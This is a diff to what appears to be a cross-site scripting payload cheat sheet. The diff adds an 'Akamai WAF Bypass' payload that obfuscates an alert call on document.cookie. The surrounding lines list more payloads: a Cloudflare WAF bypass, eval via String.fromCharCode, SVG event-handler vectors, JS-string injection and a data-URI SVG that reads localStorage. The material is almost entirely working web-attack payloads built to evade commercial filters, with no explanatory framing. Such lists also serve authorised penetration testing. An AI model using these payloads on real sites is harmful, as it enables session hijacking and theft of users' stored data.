@@ -30,6 +30,9 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 <svg><animate onbegin=confirm(1) attributeName=x dur=1s></animate></svg>
 <svg><xss onload=\u0063onfirm(1)></xss></svg>
 
+XSS Akamai WAF Bypass:
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
 Cloudflare Bypass, checked on 11/10/2025 (U.S. date):
 <Img Src=OnXSS OnErroR=confirm(111)>
 %3CImg%20Src%3DOnXSS%20OnErroR%3Dconfirm%28111%29%3E
@@ -52,6 +55,8 @@ eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59));
 ');eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59));//
 
 
+
+
 Grabbing from LocalStorage:
 
 JS-string injection (if reflected into a JS string):
@@ -68,6 +73,7 @@ iframe srcdoc (may bypass some filters):
 
 SVG with script (data URI):
 <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Eparent.document.body.appendChild(parent.document.createTextNode(localStorage.getItem('MY_KEY')))%3C/script%3E%3C/svg%3E">
+
 
 
 
